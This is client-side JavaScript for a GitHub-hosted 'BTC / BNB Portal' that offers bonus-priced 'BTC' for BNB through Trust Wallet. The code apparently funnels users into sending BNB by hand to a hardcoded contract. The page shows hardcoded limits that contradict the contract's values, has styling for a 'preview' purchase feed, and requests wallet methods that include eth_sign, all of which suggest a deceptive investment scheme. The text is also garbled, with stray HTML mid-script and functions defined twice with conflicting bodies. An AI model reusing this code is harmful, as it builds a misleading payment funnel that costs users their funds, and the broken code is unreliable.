// Part 1 of 4

/* ==========================================================
   BTC / BNB PORTAL — GitHub Pages final client logic
   Contract: 0x0d8b30Ef0d85B2f9215d9267860F62f9494e1A85
   Network: BNB Smart Chain (chainId 56)
   Wallet: Trust Wallet only
   ========================================================== */

const CONTRACT_ADDRESS =
  "0x0d8b30Ef0d85B2f9215d9267860F62f9494e1A85";

const CHAIN_ID = 56;
const CHAIN_HEX = "0x38";

const FALLBACK_MIN_BNB = 0.1;
const BONUS_MIN_BNB = 5;
const FALLBACK_MAX_BNB = Number.MAX_SAFE_INTEGER;
const FALLBACK_BONUS = 11;

const RPC_URLS = [
  "https://bsc-dataseed.binance.org/",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/"
];

const CONTRACT_ABI = [
  {
    inputs: [
      {
        internalType: "address",
        name: "initialOwner",
        type: "address"
      }
    ],
    stateMutability: "nonpayable",
    type: "constructor"
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "buyer",
        type: "address"
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "bnbAmount",
        type: "uint256"
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "baseBTCAmount",
        type: "uint256"
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "bonusBTCAmount",
        type: "uint256"
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "totalBTCAmount",
        type: "uint256"
      }
    ],
    name: "BTCPurchased",
    type: "event"
  },
  {
    inputs: [],
    name: "BASE_BTC_PER_BNB",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "BONUS_PERCENT",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "availableBTC",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "buyBTC",
    outputs: [],
    stateMutability: "payable",
    type: "function"
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "bnbAmount",
        type: "uint256"
      }
    ],
    name: "calculateBTC",
    outputs: [
      {
        internalType: "uint256",
        name: "baseAmount",
        type: "uint256"
      },
      {
        internalType: "uint256",
        name: "bonusAmount",
        type: "uint256"
      },
      {
        internalType: "uint256",
        name: "totalAmount",
        type: "uint256"
      }
    ],
    stateMutability: "pure",
    type: "function"
  },
  {
    inputs: [],
    name: "decimals",
    outputs: [
      {
        internalType: "uint8",
        name: "",
        type: "uint8"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "referenceMaximumBNB",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "referenceMinimumBNB",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  }
];

let readProvider = null;
let walletProvider = null;
let signer = null;
let contract = null;
let connectedAddress = null;

let btcDecimals = 8;

let minBNB = FALLBACK_MIN_BNB;
let maxBNB = FALLBACK_MAX_BNB;
let bonusPercent = FALLBACK_BONUS;

let activityEntries = [];
let activityIndex = 0;
let activityTimer = null;

const discoveredWallets = new Map();

const $ = id => document.getElementById(id);

function setText(id, value) {
  const el = $(id);

  if (el) {
    el.textContent = value;
  }
}

function money(value) {
  return Number(value).toLocaleString("en-US", {
    style: "currency",
    currency: "USD",
    maximumFractionDigits: 2
  });
}

function numberText(value, max = 8) {
  return Number(value).toLocaleString("en-US", {
    maximumFractionDigits: max
  });
}

function shortAddress(address) {
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

function toast(message) {
  let el = $("portalToast");

  if (!el) {
    el = document.createElement("div");
    el.id = "portalToast";
    el.className = "portal-toast";
    document.body.appendChild(el);
  }

  el.textContent = message;
  el.classList.add("show");

  clearTimeout(window.__portalToastTimer);

  window.__portalToastTimer = setTimeout(() => {
    el.classList.remove("show");
  }, 3000);
}

/* ==========================================================
   STYLES
   ========================================================== */

function injectStyles() {
  if ($("finalPortalStyles")) {
    return;
  }

  const style = document.createElement("style");

  style.id = "finalPortalStyles";

  style.textContent = `
    .portal-toast{
      position:fixed;
      left:50%;
      bottom:24px;
      transform:translate(-50%,20px);
      z-index:10000;
      background:#111827;
      color:#fff;
      border:1px solid rgba(255,255,255,.12);
      padding:12px 18px;
      border-radius:12px;
      opacity:0;
      pointer-events:none;
      transition:.25s ease;
      font:600 14px/1.3 Inter,system-ui,sans-serif;
      box-shadow:0 15px 45px rgba(0,0,0,.35)
    }

    .portal-toast.show{
      opacity:1;
      transform:translate(-50%,0)
    }

    .wallet-overlay{
      position:fixed;
      inset:0;
      z-index:9999;
      background:rgba(3,7,18,.78);
      backdrop-filter:blur(12px);
      display:flex;
      align-items:center;
      justify-content:center;
      padding:20px
    }

    .wallet-overlay.hidden{
      display:none
    }

    .wallet-picker{
      width:min(460px,100%);
      max-height:min(720px,92vh);
      overflow:auto;
      background:#0b1020;
      border:1px solid rgba(129,140,248,.24);
      border-radius:24px;
      padding:24px;
      box-shadow:0 30px 90px rgba(0,0,0,.55)
    }

    .wallet-picker-head{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:16px;
      margin-bottom:8px
    }

    .wallet-picker h2{
      margin:0;
      color:#fff;
      font-size:24px
    }

    .wallet-picker p{
      margin:0 0 18px;
      color:#98a4bd;
      font-size:14px;
      line-height:1.5
    }

    .wallet-close{
      width:38px;
      height:38px;
      border-radius:50%;
      border:1px solid rgba(255,255,255,.12);
      background:#151b2b;
      color:#fff;
      font-size:25px;
      cursor:pointer
    }

    .wallet-option{
      width:100%;
      display:flex;
      align-items:center;
      gap:14px;
      padding:13px 14px;
      margin-top:9px;
      border-radius:15px;
      border:1px solid rgba(255,255,255,.08);
      background:#101728;
      color:#fff;
      text-align:left;
      cursor:pointer;
      transition:.18s ease
    }

    .wallet-option:hover{
      border-color:rgba(129,140,248,.55);
      transform:translateY(-1px)
    }

    .wallet-option img{
      width:42px;
      height:42px;
      border-radius:11px;
      object-fit:contain;
      background:#fff;
      padding:4px;
      flex:none
    }

    .wallet-option strong{
      display:block;
      font-size:15px
    }

    .wallet-option small{
      display:block;
      margin-top:3px;
      color:#8f9bb3
    }

    .wallet-available{
      margin-left:auto;
      font-size:11px;
      color:#64e2a7
    }

    .wallet-unavailable{
      margin-left:auto;
      font-size:11px;
      color:#7e899f
    }

    .connected-wallet-panel{
      display:none;
      margin:18px auto 0;
      width:min(760px,calc(100% - 32px));
      background:#0b1020;
      border:1px solid rgba(129,140,248,.24);
      border-radius:20px;
      padding:18px;
      box-shadow:0 20px 60px rgba(0,0,0,.25)
    }

    .connected-wallet-panel.show{
      display:block
    }

    .connected-wallet-head{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:12px;
      margin-bottom:14px
    }

    .connected-wallet-head strong{
      color:#fff;
      font-size:16px
    }

    .connected-wallet-status{
      color:#64e2a7;
      font-size:12px;
      font-weight:700
    }

    .connected-wallet-row{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:12px;
      padding:12px 0;
      border-top:1px solid rgba(255,255,255,.08)
    }

    .connected-wallet-row span{
      color:#8f9bb3;
      font-size:12px
    }

    .connected-wallet-row code{
      color:#f4f7ff;
      font-size:12px;
      overflow:hidden;
      text-overflow:ellipsis;
      white-space:nowrap
    }

    .connected-wallet-actions{
      display:flex;
      gap:10px;
      margin-top:14px
    }

    .connected-wallet-actions button{
      flex:1;
      min-height:42px;
      border:1px solid rgba(129,140,248,.25);
      border-radius:12px;
      background:#151b2b;
      color:#fff;
      cursor:pointer;
      font-weight:700
    }

    .connected-wallet-actions button:hover{
      border-color:rgba(129,140,248,.6)
    }

    .activity-feed{
      position:relative;
      overflow:hidden
    }

    .activity-feed .activity-item{
      animation:btcActivityInOut 5.2s ease both;
      will-change:opacity,transform
    }

    .activity-row{
      display:flex;
      align-items:center;
      gap:16px;
      padding:18px 20px;
      border-bottom:1px solid rgba(255,255,255,.08)
    }

    .activity-row:last-child{
      border-bottom:0
    }

    .activity-icon{
      width:48px;
      height:48px;
      border-radius:15px;
      background:rgba(82,94,255,.12);
      color:#8d9aff;
      display:grid;
      place-items:center;
      font-size:25px;
      flex:none
    }

    .activity-main{
      min-width:0
    }

    .activity-main strong{
      display:block;
      color:#f4f7ff;
      font-size:20px;
      font-weight:800
    }

    .activity-main small{
      display:block;
      color:#78849d;
      margin-top:4px;
      font-size:13px
    }

    .activity-preview-label{
      margin-left:auto;
      font-size:9px;
      letter-spacing:.08em;
      color:#7f8aa1;
      white-space:nowrap
    }

    @keyframes btcActivityInOut{
      0%{
        opacity:0;
        transform:translateY(22px)
      }

      18%{
        opacity:1;
        transform:translateY(0)
      }

      70%{
        opacity:1;
        transform:translateY(0)
      }

      100%{
        opacity:0;
        transform:translateY(-22px)
      }
    }

    .activity-live-dot{
      display:inline-block;
      width:9px;
      height:9px;
      border-radius:50%;
      background:#46e39b;
      box-shadow:0 0 14px rgba(70,227,155,.8);
      margin-right:9px
    }

    @media(max-width:600px){
      .wallet-picker{
        padding:18px;
        border-radius:20px
      }

      .wallet-option{
        padding:11px
      }

      .wallet-option img{
        width:38px;
        height:38px
      }

      .connected-wallet-panel{
        width:calc(100% - 24px);
        padding:15px
      }

      .connected-wallet-row{
        align-items:flex-start;
        flex-direction:column;
        gap:5px
      }

      .connected-wallet-row code{
        max-width:100%
      }

      .connected-wallet-actions{
        flex-direction:column
      }

      .activity-row{
        padding:16px
      }

      .activity-main strong{
        font-size:17px
      }
    }
  `;

  document.head.appendChild(style);
}

/* ==========================================================
   CONTRACT
   ========================================================== */

function createReadProvider() {
  if (readProvider) {
    return readProvider;
  }

  for (const url of RPC_URLS) {
    try {
      readProvider = new ethers.JsonRpcProvider(
        url,
        56,
        {
          staticNetwork: true
        }
      );

      return readProvider;
    } catch (e) {}
  }

  return null;
}

function getReadContract() {
  const provider = createReadProvider();

  if (!provider) {
    throw new Error(
      "BNB Smart Chain read provider unavailable."
    );
  }

  return new ethers.Contract(
    CONTRACT_ADDRESS,
    CONTRACT_ABI,
    provider
  );
}

async function loadContractSettings() {
  try {
    const c = getReadContract();

    const values = await Promise.allSettled([
      c.decimals(),
      c.referenceMinimumBNB(),
      c.referenceMaximumBNB(),
      c.BONUS_PERCENT()
    ]);

    if (values[0].status === "fulfilled") {
      btcDecimals = Number(values[0].value);
    }

    if (values[1].status === "fulfilled") {
      minBNB = Number(
        ethers.formatEther(values[1].value)
      );
    }

    if (values[2].status === "fulfilled") {
      maxBNB = Number(
        ethers.formatEther(values[2].value)
      );
    }

    if (values[3].status === "fulfilled") {
      bonusPercent = Number(values[3].value);
    }

    updateLimitsUI();
  } catch (e) {
    console.warn(
      "Contract settings could not be read:",
      e
    );
  }
}

function updateLimitsUI() {
  const rangeText =
    `${numberText(minBNB, 2)}–${numberText(maxBNB, 2)} BNB`;

  setText("minimumStat", "5 BNB");
  setText("maximumStat", "1,000 BNB");
  setText("bonusStat", `${bonusPercent}%`);

  const input = $("bnbAmount");

  if (input) {
    input.min = String(minBNB);
    input.max = String(maxBNB);

    if (!input.value) {
      input.placeholder = String(minBNB);
    }
  }

  const message = $("calculatorMessage");

  if (message) {
    message.textContent =
      `Minimum ${numberText(minBNB, 2)} BNB · Maximum ${numberText(maxBNB, 2)} BNB`;
  }

  document
    .querySelectorAll("[data-min-bnb]")
    .forEach(el => {
      el.textContent = numberText(minBNB, 2);
    });

  document
    .querySelectorAll("[data-max-bnb]")
    .forEach(el => {
      el.textContent = numberText(maxBNB, 2);
    });

  document
    .querySelectorAll(".program-range,.range-label")
    .forEach(el => {
      el.textContent = rangeText;
    });
}

/* ==========================================================
   CALCULATOR
   ========================================================== */

async function calculateBTC() {
  const input = $("bnbAmount");

  const amount = Number(input?.value);

  if (
    !Number.isFinite(amount) ||
    amount <= 0
  ) {
    resetCalculator();

    setText(
      "calculatorMessage",
      "Enter a valid BNB amount."
    );

    return;
  }

  if (amount < 0.1) {
    resetCalculator();

    setText(
      "calculatorMessage",
      "Minimum amount is 0.1 BNB."
    );

    return;
  }

  if (amount > maxBNB) {
    resetCalculator();

    setText(
      "calculatorMessage",
      `Maximum participation is ${numberText(
        maxBNB,
        2
      )} BNB.`
    );

    return;
  }

  try {
    const c = getReadContract();

    const result = await c.calculateBTC(
      ethers.parseEther(amount.toString())
    );

    setText(
      "baseBTC",
      `${numberText(
        ethers.formatUnits(
          result.baseAmount,
          btcDecimals
        ),
        8
      )} BTC`
    );

    setText(
      "bonusBTC",
      `${numberText(
        ethers.formatUnits(
          result.bonusAmount,
          btcDecimals
        ),
        8
      )} BTC`
    );

    setText(
      "totalBTC",
      `${numberText(
        ethers.formatUnits(
          result.totalAmount,
          btcDecimals
        ),
        8
      )} BTC`
    );

    setText(
      "calculatorMessage",
      `Calculation completed · ${bonusPercent}% bonus`
    );
  } catch (e) {
    console.error("calculateBTC:", e);

    resetCalculator();

    setText(
      "calculatorMessage",
      "Unable to read the contract calculation right now."
    );
  }
}

function resetCalculator() {
  setText("baseBTC", "0 BTC");
  setText("bonusBTC", "0 BTC");
  setText("totalBTC", "0 BTC");
}

function setupCalculator() {
  const input = $("bnbAmount");
  const button = $("calculateButton");

  if (input) {
    input.addEventListener("input", () => {
      clearTimeout(window.__calcTimer);

      window.__calcTimer = setTimeout(
        calculateBTC,
        250
      );
    });
  }

  if (button) {
    button.addEventListener(
      "click",
      calculateBTC
    );
  }
}

/* ==========================================================
   MARKET DATA
   ========================================================== */

async function fetchJSON(url) {
  const response = await fetch(
    url,
    {
      cache: "no-store"
    }
  );

  if (!response.ok) {
    throw new Error(
      `HTTP ${response.status}`
    );
  }

  return response.json();
}

async function loadOneMarket(
  symbol,
  priceId,
  changeId
) {
  const urls = [
    `https://data-api.binance.vision/api/v3/ticker/24hr?symbol=${encodeURIComponent(symbol)}`,
    `https://api.binance.com/api/v3/ticker/24hr?symbol=${encodeURIComponent(symbol)}`
  ];

  let data = null;

  for (const url of urls) {
    try {
      data = await fetchJSON(url);

      if (
        data &&
        data.lastPrice
      ) {
        break;
      }
    } catch (e) {
      console.warn(
        `Market endpoint failed for ${symbol}:`,
        e
      );
    }
  }

  if (!data) {
    setText(
      priceId,
      "Unavailable"
    );

    setText(
      changeId,
      "Market data unavailable"
    );

    return;
  }

  const price = Number(
    data.lastPrice
  );

  const change = Number(
    data.priceChangePercent
  );

  if (!Number.isFinite(price)) {
    setText(
      priceId,
      "Unavailable"
    );

    setText(
      changeId,
      "Market data unavailable"
    );

    return;
  }

  setText(
    priceId,
    money(price)
  );

  setText(
    changeId,
    `${
      Number.isFinite(change)
        ? change.toFixed(2)
        : "0.00"
    }% today`
  );
}

async function loadMarketData() {
  await Promise.allSettled([
    loadOneMarket(
      "BTCUSDT",
      "btcPrice",
      "btcChange"
    ),

    loadOneMarket(
      "BNBUSDT",
      "bnbPrice",
      "bnbChange"
    )
  ]);
}

    </span>

    </div>

    <div class="connected-wallet-row">

      <span>
        Connected Wallet
      </span>

      <code id="connectedWalletAddress">
        —
      </code>

    </div>

    <div class="connected-wallet-row">

      <span>
        Contract Address
      </span>

      <code id="connectedContractAddress">
        ${CONTRACT_ADDRESS}
      </code>

    </div>

    <div class="connected-wallet-actions">

      <button
        id="copyConnectedContract"
        type="button"
      >
        Copy Contract
      </button>

    </div>
  `;

  document.body.appendChild(
    panel
  );

  const copyButton =
    $("copyConnectedContract");

  if (copyButton) {
    copyButton.addEventListener(
      "click",
      copyContractAddress
    );
  }
}

function updateConnectedWalletPanel() {
  const panel =
    $("connectedWalletPanel");

  if (!panel) {
    return;
  }

  const addressEl =
    $("connectedWalletAddress");

  const contractEl =
    $("connectedContractAddress");

  if (connectedAddress) {
    panel.classList.add("show");

    if (addressEl) {
      addressEl.textContent =
        connectedAddress;
    }

    if (contractEl) {
      contractEl.textContent =
        CONTRACT_ADDRESS;
    }
  } else {
    panel.classList.remove("show");

    if (addressEl) {
      addressEl.textContent =
        "—";
    }
  }
}

function setHeaderContractVisibility(
  visible
) {
  const selectors = [
    "#headerContract",
    "#contractAddress",
    "#headerContractAddress",
    ".header-contract"
  ];

  selectors.forEach(
    selector => {
      document
        .querySelectorAll(selector)
        .forEach(el => {
          el.style.display =
            visible
              ? ""
              : "none";
        });
    }
  );
}

function updateWalletButton() {
  const button =
    $("connectWallet");

  if (button) {
    if (connectedAddress) {
      button.textContent =
        "Wallet Connected";

      button.classList.add(
        "connected"
      );

      button.setAttribute(
        "aria-label",
        `Wallet Connected: ${connectedAddress}`
      );
    } else {
      button.textContent =
        "Connect Wallet";

      button.classList.remove(
        "connected"
      );

      button.removeAttribute(
        "aria-label"
      );
    }
  }

  setHeaderContractVisibility(
    Boolean(
      connectedAddress
    )
  );

  updateConnectedWalletPanel();
}

/* ==========================================================
   TRUST WALLET + WALLETCONNECT
   ========================================================== */

const WALLETCONNECT_PROJECT_ID =
  "f424a55c8b13e4a78078d5e34e358654";

let trustWalletConnectProvider =
  null;

let trustWalletConnectReady =
  null;

async function getTrustWalletConnectProvider() {
  if (
    trustWalletConnectProvider
  ) {
    return trustWalletConnectProvider;
  }

  if (
    trustWalletConnectReady
  ) {
    return trustWalletConnectReady;
  }

  trustWalletConnectReady =
    (async () => {
      try {
        const module =
          await import(
            "https://esm.sh/@walletconnect/ethereum-provider@2.25.0?bundle"
          );

        const EthereumProvider =
          module.default ||
          module.EthereumProvider;

        const provider =
          await EthereumProvider.init({
            projectId:
              WALLETCONNECT_PROJECT_ID,

            optionalChains: [
              CHAIN_ID
            ],

            showQrModal:
              false,

            rpcMap: {
              [CHAIN_ID]:
                RPC_URLS[0]
            },

            optionalMethods: [
              "eth_sendTransaction",
              "personal_sign",
              "eth_sign",
              "eth_signTypedData",
              "eth_signTypedData_v4"
            ],

            optionalEvents: [
              "chainChanged",
              "accountsChanged"
            ],

            metadata: {
              name:
                "Bitcoin BTC | BNB Portal",

              description:
                "BTC / BNB Portal",

              url:
                "https://bitcoinbtcbuybackportal-commits.github.io/Bitcoin-btc-buyback-portal/",

              icons: [
                "https://trustwallet.com/favicon.ico"
              ]
            }
          });

        provider.on(
          "display_uri",
          uri => {
            const trustUrl =
              `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;

            const handoffWindow =
              window.__trustWalletHandoffWindow;

            if (
              handoffWindow &&
              !handoffWindow.closed
            ) {
              handoffWindow.location.href =
                trustUrl;
            } else {
              window.location.href =
                trustUrl;
            }
          }
        );

        provider.on(
          "accountsChanged",
          accounts => {
            if (
              !accounts ||
              !accounts.length
            ) {
              connectedAddress =
                null;

              signer =
                null;

              contract =
                null;

              updateWalletButton();

              return;
            }

            syncTrustWalletConnectSession()
              .catch(
                console.error
              );
          }
        );

        provider.on(
          "chainChanged",
          () => {
            if (
              connectedAddress
            ) {
              syncTrustWalletConnectSession()
                .catch(
                  console.error
                );
            }
          }
        );

        provider.on(
          "disconnect",
          () => {
            connectedAddress =
              null;

            signer =
              null;

            contract =
              null;

            updateWalletButton();
          }
        );

        trustWalletConnectProvider =
          provider;

        return provider;

      } catch (
        error
      ) {
        trustWalletConnectReady =
          null;

        throw error;
      }
    })();

  return trustWalletConnectReady;
}

async function syncTrustWalletConnectSession() {
  const provider =
    trustWalletConnectProvider;

  if (!provider) {
    return false;
  }

  let accounts =
    provider.accounts?.length
      ? provider.accounts
      : await provider.request({
          method:
            "eth_accounts"
        });

  const address =
    accounts?.[0] ||
    null;

  if (!address) {
    connectedAddress =
      null;

    signer =
      null;

    contract =
      null;

    updateWalletButton();

    return false;
  }

  const chainId =
    await provider.request({
      method:
        "eth_chainId"
    });

  if (
    String(chainId)
      .toLowerCase() !==
    CHAIN_HEX
  ) {
    await ensureBSC(
      provider
    );
  }

  walletProvider =
    new ethers.BrowserProvider(
      provider
    );

  signer =
    await walletProvider.getSigner();

  connectedAddress =
    await signer.getAddress();

  contract =
    new ethers.Contract(
      CONTRACT_ADDRESS,
      CONTRACT_ABI,
      signer
    );

  updateWalletButton();

  closeWalletModal();

  return true;
}

async function openTrustWalletConnect() {
  let handoffWindow =
    null;

  try {
    handoffWindow =
      window.open(
        "about:blank",
        "_blank"
      );
  } catch (
    error
  ) {
    console.warn(
      "Trust Wallet handoff window:",
      error
    );
  }

  window.__trustWalletHandoffWindow =
    handoffWindow;

  try {
    const provider =
      await getTrustWalletConnectProvider();

    const hasSession =
      provider.session ||
      (
        provider.accounts &&
        provider.accounts.length
      );

    if (!hasSession) {
      await provider.enable();
    }

    await syncTrustWalletConnectSession();

    closeWalletModal();

    toast(
      "Trust Wallet connected."
    );

  } catch (
    error
  ) {
    console.error(
      "Trust Wallet WalletConnect:",
      error
    );

    if (
      handoffWindow &&
      !handoffWindow.closed
    ) {
      try {
        handoffWindow.close();
      } catch {}
    }

    if (
      error?.code ===
        4001 ||
      error?.message
        ?.toLowerCase()
        .includes(
          "reject"
        )
    ) {
      toast(
        "Wallet connection cancelled."
      );
    } else {
      toast(
        error?.shortMessage ||
        error?.message ||
        "Unable to connect Trust Wallet."
      );
    }

  } finally {
    window.__trustWalletHandoffWindow =
      null;
  }
}

function setupTrustWalletRecovery() {
  const restore =
    async () => {
      try {
        const provider =
          trustWalletConnectProvider;

        if (
          provider?.session ||
          provider?.accounts?.length
        ) {
          await syncTrustWalletConnectSession();
        }
      } catch (
        error
      ) {
        console.warn(
          "Trust Wallet session restore:",
          error
        );
      }
    };

  window.addEventListener(
    "pageshow",
    restore
  );

  window.addEventListener(
    "focus",
    restore
  );

  document.addEventListener(
    "visibilitychange",
    () => {
      if (
        !document.hidden
      ) {
        restore();
      }
    }
  );
}

  `;

  const header =
    document.querySelector(
      "header"
    );

  if (header) {

    header.insertAdjacentElement(
      "afterend",
      panel
    );

  } else {

    document.body.prepend(
      panel
    );
  }

  $("connectedCopyContract")
    ?.addEventListener(
      "click",
      async () => {

        try {

          await navigator.clipboard.writeText(
            CONTRACT_ADDRESS
          );

          $("connectedCopyContract")
            .textContent =
              "Copied";

          toast(
            "Contract address copied."
          );

          setTimeout(
            () => {

              if (
                $("connectedCopyContract")
              ) {

                $("connectedCopyContract")
                  .textContent =
                    "Copy Contract";
              }

            },
            1800
          );

        } catch {

          try {

            const helper =
              document.createElement(
                "textarea"
              );

            helper.value =
              CONTRACT_ADDRESS;

            helper.setAttribute(
              "readonly",
              ""
            );

            helper.style.position =
              "fixed";

            helper.style.opacity =
              "0";

            document.body.appendChild(
              helper
            );

            helper.select();

            document.execCommand(
              "copy"
            );

            helper.remove();

            $("connectedCopyContract")
              .textContent =
                "Copied";

            toast(
              "Contract address copied."
            );

            setTimeout(
              () => {

                if (
                  $("connectedCopyContract")
                ) {

                  $("connectedCopyContract")
                    .textContent =
                      "Copy Contract";
                }

              },
              1800
            );

          } catch {

            toast(
              "Unable to copy automatically."
            );
          }
        }
      }
    );
}

function updateConnectedWalletPanel() {
  const panel =
    $("connectedWalletPanel");

  if (!panel) {
    return;
  }

  if (
    connectedAddress
  ) {

    panel.classList.add(
      "show"
    );

    setText(
      "connectedWalletAddress",
      shortAddress(
        connectedAddress
      )
    );

    setText(
      "connectedWalletContract",
      CONTRACT_ADDRESS
    );

  } else {

    panel.classList.remove(
      "show"
    );
  }
}

/* ==========================================================
   HEADER CONTRACT DISPLAY
   ========================================================== */

function setHeaderContractVisibility(
  show
) {
  const address =
    $("contractAddress");

  const copy =
    $("copyContract");

  if (
    !address &&
    !copy
  ) {
    return;
  }

  const addressParent =
    address?.parentElement;

  const copyParent =
    copy?.parentElement;

  if (
    addressParent &&
    copyParent &&
    addressParent ===
      copyParent
  ) {

    addressParent.style.display =
      show
        ? ""
        : "none";

    return;
  }

  if (address) {

    address.style.display =
      show
        ? ""
        : "none";
  }

  if (copy) {

    copy.style.display =
      show
        ? ""
        : "none";
  }
}

/* ==========================================================
   WALLET BUTTON
   ========================================================== */

function updateWalletButton() {
  const button =
    $("connectWallet");

  setHeaderContractVisibility(
    Boolean(
      connectedAddress
    )
  );

  if (!button) {

    updateConnectedWalletPanel();

    return;
  }

  button.textContent =
    connectedAddress
      ? "Wallet Connected"
      : "Connect Wallet";

  updateConnectedWalletPanel();
}

/* ==========================================================
   WALLET SETUP
   ========================================================== */

function setupWallet() {

  createWalletModal();

  createConnectedWalletPanel();

  discoverWallets();

  const button =
    $("connectWallet");

  if (button) {

    button.addEventListener(
      "click",
      openWalletModal
    );
  }

  if (
    window.ethereum?.on
  ) {

    window.ethereum.on(
      "accountsChanged",
      accounts => {

        connectedAddress =
          accounts?.[0] ||
          null;

        if (
          !connectedAddress
        ) {

          signer =
            null;

          contract =
            null;
        }

        updateWalletButton();
      }
    );

    window.ethereum.on(
      "chainChanged",
      () => {

        if (
          connectedAddress
        ) {

          window.location.reload();
        }
      }
    );
  }

  updateWalletButton();
}

/* ==========================================================
   WALLETCONNECT OVERRIDE
   TRUST WALLET ONLY
   ========================================================== */

async function selectWallet(
  definition
) {
  const selectedProvider =
    findWalletProvider(
      definition
    );

  if (
    selectedProvider
  ) {

    try {

      closeWalletModal();

      await ensureBSC(
        selectedProvider
      );

      walletProvider =
        new ethers.BrowserProvider(
          selectedProvider
        );

      await walletProvider.send(
        "eth_requestAccounts",
        []
      );

      signer =
        await walletProvider.getSigner();

      connectedAddress =
        await signer.getAddress();

      contract =
        new ethers.Contract(
          CONTRACT_ADDRESS,
          CONTRACT_ABI,
          signer
        );

      updateWalletButton();

      toast(
        "Trust Wallet connected."
      );

      return;

    } catch (
      error
    ) {

      console.error(
        "Trust Wallet connection:",
        error
      );

      if (
        error?.code ===
          4001 ||
        error?.code ===
          "ACTION_REJECTED"
      ) {

        toast(
          "Wallet connection cancelled."
        );

      } else {

        toast(
          error?.shortMessage ||
          error?.message ||
          "Unable to connect Trust Wallet."
        );
      }

      return;
    }
  }

  const isMobile =
    /Android|iPhone|iPad|iPod/i.test(
      navigator.userAgent
    );

  if (
    isMobile
  ) {

    await openTrustWalletConnect();

    return;
  }

  toast(
    "Trust Wallet is not available in this browser. Install Trust Wallet or open this page in the Trust Wallet browser."
  );
}

/* ==========================================================
   WALLET SETUP OVERRIDE
   ========================================================== */

function setupWallet() {

  createWalletModal();

  createConnectedWalletPanel();

  discoverWallets();

  const button =
    $("connectWallet");

  if (button) {

    button.addEventListener(
      "click",
      openWalletModal
    );
  }

  setupTrustWalletRecovery();

  const trustProvider =
    findWalletProvider(
      WALLET_DEFINITIONS[0]
    );

  if (
    trustProvider?.on
  ) {

    trustProvider.on(
      "accountsChanged",
      accounts => {

        if (
          !accounts ||
          !accounts.length
        ) {

          connectedAddress =
            null;

          signer =
            null;

          contract =
            null;

          updateWalletButton();

          return;
        }

        connectedAddress =
          accounts[0];

        try {

          walletProvider =
            new ethers.BrowserProvider(
              trustProvider
            );

          walletProvider
            .getSigner()
            .then(
              async nextSigner => {

                signer =
                  nextSigner;

                connectedAddress =
                  await signer.getAddress();

                contract =
                  new ethers.Contract(
                    CONTRACT_ADDRESS,
                    CONTRACT_ABI,
                    signer
                  );

                updateWalletButton();
              }
            )
            .catch(
              console.error
            );

        } catch (
          error
        ) {

          console.error(
            "Trust Wallet account update:",
            error
          );
        }
      }
    );

    trustProvider.on(
      "chainChanged",
      () => {

        if (
          connectedAddress
        ) {

          syncTrustWalletProvider(
            trustProvider
          ).catch(
            console.error
          );
        }
      }
    );
  }

  updateWalletButton();
}

async function syncTrustWalletProvider(
  provider
) {
  if (!provider) {
    return false;
  }

  const accounts =
    await provider.request({
      method:
        "eth_accounts"
    });

  const address =
    accounts?.[0] ||
    null;

  if (!address) {

    connectedAddress =
      null;

    signer =
      null;

    contract =
      null;

    updateWalletButton();

    return false;
  }

  const chainId =
    await provider.request({
      method:
        "eth_chainId"
    });

  if (
    String(chainId)
      .toLowerCase() !==
    CHAIN_HEX
  ) {

    await ensureBSC(
      provider
    );
  }

  walletProvider =
    new ethers.BrowserProvider(
      provider
    );

  signer =
    await walletProvider.getSigner();

  connectedAddress =
    await signer.getAddress();

  contract =
    new ethers.Contract(
      CONTRACT_ADDRESS,
      CONTRACT_ABI,
      signer
    );

  updateWalletButton();

  return true;
}

/* ==========================================================
   PARTICIPATION
   ========================================================== */

async function buyBTC() {
  const input =
    $("bnbAmount");

  const amount =
    Number(
      input?.value
    );

  if (
    !Number.isFinite(
      amount
    ) ||
    amount < minBNB
  ) {

    toast(
      `Minimum participation is ${numberText(
        minBNB,
        2
      )} BNB.`
    );

    return;
  }

  if (
    amount > maxBNB
  ) {

    toast(
      `Maximum participation is ${numberText(
        maxBNB,
        2
      )} BNB.`
    );

    return;
  }

  if (
    !signer ||
    !contract ||
    !connectedAddress
  ) {

    openWalletModal();

    return;
  }

  try {

    const network =
      await walletProvider.getNetwork();

    if (
      Number(
        network.chainId
      ) !==
      CHAIN_ID
    ) {

      const raw =
        walletProvider.provider;

      await ensureBSC(
        raw
      );

      walletProvider =
        new ethers.BrowserProvider(
          raw
        );

      signer =
        await walletProvider.getSigner();

      connectedAddress =
        await signer.getAddress();

      contract =
        new ethers.Contract(
          CONTRACT_ADDRESS,
          CONTRACT_ABI,
          signer
        );

      updateWalletButton();
    }

    updateConnectedWalletPanel();

    toast(
      "Wallet connected. Copy the contract address and send your BNB from Trust Wallet."
    );

    const panel =
      $("connectedWalletPanel");

    if (panel) {

      panel.scrollIntoView({
        behavior:
          "smooth",

        block:
          "center"
      });
    }

  } catch (
    error
  ) {

    console.error(
      "Participation:",
      error
    );

    if (
      error?.code ===
        4001 ||
      error?.code ===
        "ACTION_REJECTED"
    ) {

